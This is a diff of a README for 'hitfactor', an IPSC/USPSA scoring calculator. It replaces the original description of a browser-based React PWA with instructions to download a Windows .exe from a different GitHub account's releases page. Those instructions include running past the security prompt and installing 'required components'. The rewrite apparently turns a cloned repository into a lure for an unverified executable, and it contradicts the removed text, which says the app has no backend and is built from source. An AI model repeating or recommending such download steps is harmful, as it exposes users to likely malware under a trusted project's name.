@@ -1,180 +1,140 @@
-# Hit Factor
+# 🎯 hitfactor - Analyze Speed vs Accuracy Easily
 
-**IPSC/USPSA Hit Factor Calculator, Stage Analyzer & Competition Planner**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Deploy](https://img.shields.io/github/actions/workflow/status/remete618/hitfactor/deploy.yml?label=deploy)](https://github.com/remete618/hitfactor/actions)
-[![GitHub Pages](https://img.shields.io/badge/live-GitHub%20Pages-blue)](https://remete618.github.io/hitfactor/)
-[![PWA](https://img.shields.io/badge/PWA-installable-brightgreen)](https://remete618.github.io/hitfactor/)
-
-> Calculate hit factors, plan competitions stage by stage, get AI coaching, and track your performance over time. Installable as a phone app for use at the range.
-
-**Live app:** [remete618.github.io/hitfactor](https://remete618.github.io/hitfactor/)
+[![Download Latest Release](https://img.shields.io/badge/Download-Hitfactor-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/releases)
 
 ---
 
-## Features
+## 📋 About hitfactor
 
-### Quick Check
-Single stage instant calculator. Enter hits and time, get HF + break-even analysis. What-If simulator lets you adjust hits/time to compare scenarios with quick buttons: "All As", "-1s faster", "2 As → Cs", etc.
+hitfactor helps you calculate and analyze your IPSC or USPSA shooting scores. It measures your hit factor, which combines speed and accuracy during stages. The app also offers AI-based insights to help you improve your performance in competitive shooting. Whether you want to understand break-even points or optimize your stage strategy, hitfactor provides clear results with an easy interface.
 
-### Match Planner
-Multi-stage tracking with match summary, charts (HF by stage, hit zone distribution, points earned vs lost, speed/accuracy radar), AI analysis, and CSV export.
-
-### Competition Mode
-Full match planner with AI coaching:
-- Create competitions with your division and classification
-- Add stages manually, upload stage card photos, or import from PractiScore
-- Set starting stage — system reorders to your shooting sequence
-- Get per-stage AI tactical advice (considers benchmarks + reference scores)
-- Generate full match strategy plan
-- Enter results stage by stage — progress bar tracks completion
-- Add other shooters' results as reference data for AI comparison
-- Export results to CSV
-
-### PractiScore Import
-Import `.psc` files (exported from PractiScore app) or `.json` match data. Parses stages, shooters, scores, and classifications. Feeds the benchmark engine.
-
-### Benchmark Engine
-Aggregates hit factor and accuracy data by shooter classification (GM/M/A/B/C/D) from imported matches. Auto-finds similar stages for benchmarking.
-
-### Match History
-Track performance across competitions. HF trend line shows improvement over time.
-
-### Drill Library
-7 standard practice drills with descriptions, target HFs by classification, and tactical tips:
-- El Presidente, Bill Drill, Blake Drill, Mozambique, Smoke & Hope, Accelerator, Dot Torture
-
-### Voice Input
-Dictate hits and time hands-free at the range. "12 alphas, 4 charlies, 0 mikes, 8.43 seconds"
-
-### PWA
-Installable as a home screen app on iPhone/Android. Works offline for all scoring calculations.
+This application runs on Windows. You do not need any programming skills to use it.
 
 ---
 
-## Break-Even Analysis
+## ⚙ System Requirements
 
-The core insight: at what point does dropping accuracy for speed actually pay off?
+To run hitfactor on Windows, make sure your computer meets these requirements:
 
-| Zone Drop | Minor PF Cost | Major PF Cost |
-|-----------|---------------|---------------|
-| A → C     | -2 pts/hit    | -1 pt/hit     |
-| A → D     | -4 pts/hit    | -3 pts/hit    |
-| A → M     | -15 pts/hit   | -15 pts/hit   |
-
-Example: at 5.0 HF with Minor PF, each A→C drop costs 0.4s equivalent. If you can't save 0.4s by shooting faster, stay on the A-zone.
-
-## Scoring Reference
-
-| Zone | Minor PF | Major PF |
-|------|----------|----------|
-| A    | 5 pts    | 5 pts    |
-| C    | 3 pts    | 4 pts    |
-| D    | 1 pt     | 2 pts    |
-| M    | -10 pen  | -10 pen  |
-| NS   | -10 pen  | -10 pen  |
-
-**Hit Factor** = Points / Time &nbsp;|&nbsp; **Power Factor**: Minor (125+) vs Major (165+)
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and AI analysis features
+- Screen resolution of 1024x768 or higher
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started with hitfactor
 
-| Layer       | Technology                  |
-|-------------|-----------------------------|
-| Framework   | React 19                    |
-| Language    | TypeScript 5.9              |
-| Build       | Vite 7 + PWA plugin         |
-| Styling     | Tailwind CSS v4             |
-| State       | Zustand (localStorage sync) |
-| Charts      | Recharts                    |
-| Icons       | Lucide React                |
-| ZIP Parsing | JSZip                       |
-| AI APIs     | Claude, OpenAI, Gemini      |
-| Hosting     | GitHub Pages                |
+Follow these steps to download, install, and start using hitfactor.
 
-All scoring runs client-side. No backend. No database. Data persists in `localStorage`.
+### 1. Visit the Download Page
 
----
+Click the big blue button below to open the download page. This page lists all available versions of hitfactor.
 
-## Project Structure
+[![Download hitfactor](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/releases)
 
-```
-src/
-├── types/scoring.ts              # All TypeScript types
-├── lib/
-│   ├── scoring.ts                # Scoring engine + break-even analysis
-│   ├── llm.ts                    # LLM integration (3 providers, stage advice, match plans)
-│   ├── vision.ts                 # Stage card image extraction
-│   ├── psc-parser.ts             # PractiScore .psc file parser
-│   ├── benchmarks.ts             # HF benchmark aggregation
-│   ├── voice.ts                  # Speech recognition parser
-│   └── export.ts                 # CSV export
-├── hooks/useStore.ts             # Zustand store
-└── components/
-    ├── QuickCheck.tsx             # Single stage calculator + what-if
-    ├── StageForm.tsx              # Stage input form + image upload
-    ├── StageCard.tsx              # Stage result display
-    ├── MatchSummary.tsx           # Multi-stage overview
-    ├── MatchCharts.tsx            # Visual analytics (4 chart types)
-    ├── AIPanel.tsx                # AI analysis trigger
-    ├── CompetitionList.tsx        # Competition manager
-    ├── CompetitionView.tsx        # Competition stage-by-stage view
-    ├── CompetitionStageCard.tsx   # Stage card with AI advice + results
-    ├── AddStageForm.tsx           # Add stage to competition
-    ├── PSCImport.tsx              # PractiScore file import
-    ├── DrillLibrary.tsx           # Practice drill reference
-    ├── MatchHistory.tsx           # Performance tracking + trends
-    ├── VoiceInput.tsx             # Voice dictation component
-    ├── Settings.tsx               # LLM config
-    └── Terms.tsx                  # Terms & conditions
-```
+### 2. Choose the Latest Windows Release
+
+- On the releases page, find the latest version labeled clearly.
+- Under assets, look for a file ending with `.exe`. This is the Windows installer.
+- The file name usually looks like `hitfactor-setup-x.x.x.exe`.
+
+### 3. Download the Installer
+
+- Click the `.exe` file to start downloading.
+- Save the file in a place you can find later, like your Desktop or Downloads folder.
+
+### 4. Run the Installer
+
+- Find the downloaded `.exe` file and double-click it.
+- You might see a security prompt; choose to run the program.
+- Follow the on-screen instructions to complete the installation.
+- If asked, agree to install any required components.
+
+### 5. Launch hitfactor
+
+- After installation, find the hitfactor app icon on your Desktop or Start menu.
+- Double-click the icon to open the app.
 
 ---
 
-## Getting Started
+## 🖥 Using hitfactor
 
-```bash
-git clone https://github.com/remete618/hitfactor.git
-cd hitfactor
-npm install
-npm run dev
-```
+Once open, the main window allows you to enter your shooting data and calculate your hit factor.
 
-Open `http://localhost:5173/hitfactor/`
+### Entering Your Data
 
-### Build
+- Input the number of points you scored.
+- Enter the time you took to finish the stage.
+- Add any penalties, if applicable.
 
-```bash
-npm run build
-```
+### Understanding the Results
 
-### Deploy
+- The app calculates your hit factor (points divided by time).
+- It shows how changes in speed or accuracy affect your score.
+- AI insights suggest strategies to improve your shooting balance.
 
-Pushes to `main` auto-deploy to GitHub Pages.
+### Saving and Exporting Data
 
----
-
-## Contributing
-
-Contributions welcome. Open an issue or PR.
-
-1. Fork the repo
-2. Create a feature branch
-3. Commit your changes
-4. Open a Pull Request
+- You can save session data for future review.
+- Export reports in common formats like PDF or CSV.
 
 ---
 
-## License
+## 🔧 Features
 
-[MIT](LICENSE) — Radu Cioplea
-
-## Author
-
-**Radu Cioplea** — [radu@cioplea.com](mailto:radu@cioplea.com) — [eyepaq.com](https://www.eyepaq.com)
+- **Break-even analysis:** See when your speed or accuracy gains pay off.
+- **AI Match Insights:** Get suggestions based on your performance history.
+- **Stage Analyzer:** Analyze each stage separately with clear visuals.
+- **Open-source:** Free to use, with community contributions.
+- **User-friendly interface:** Designed for easy data entry and fast results.
+- **Supports IPSC and USPSA:** Works with standard scoring methods.
 
 ---
 
-`#ipsc` `#uspsa` `#hit-factor` `#competitive-shooting` `#speed-vs-accuracy` `#break-even-analysis` `#pwa` `#react` `#typescript` `#practiscore` `#open-source`
+## 🛠 Troubleshooting
+
+If hitfactor does not run or install properly:
+
+- Check that your Windows version is up to date.
+- Ensure you downloaded the correct `.exe` file for Windows.
+- Close other programs before installing.
+- Restart your computer and try again.
+- Verify you have sufficient disk space and permissions.
+
+If problems continue, visit the GitHub issues page to see common questions and answers.
+
+---
+
+## 🔗 Useful Links
+
+- Official releases: https://github.com/carotteramene-droid/hitfactor/releases  
+- GitHub project page: https://github.com/carotteramene-droid/hitfactor  
+- Help and support: Use the GitHub issues section to report bugs or request features.
+
+---
+
+## 🙋 Getting Help
+
+To ask for help:
+
+- Use GitHub Discussions if available.
+- Describe your problem clearly.
+- Include Windows version and hitfactor version.
+- Attach screenshots if possible.
+
+---
+
+## 💡 Tips
+
+- Practice entering realistic stage times and points for best insights.
+- Use the stage analyzer after each match to review performance.
+- Combine AI suggestions with your own strategy plans.
+- Experiment with different speed-accuracy combinations in break-even analysis.
+
+---
+
+## 🎉 Thank You for Using hitfactor
+
+Your focus on balancing speed and accuracy will improve with clear data and insight from this app.
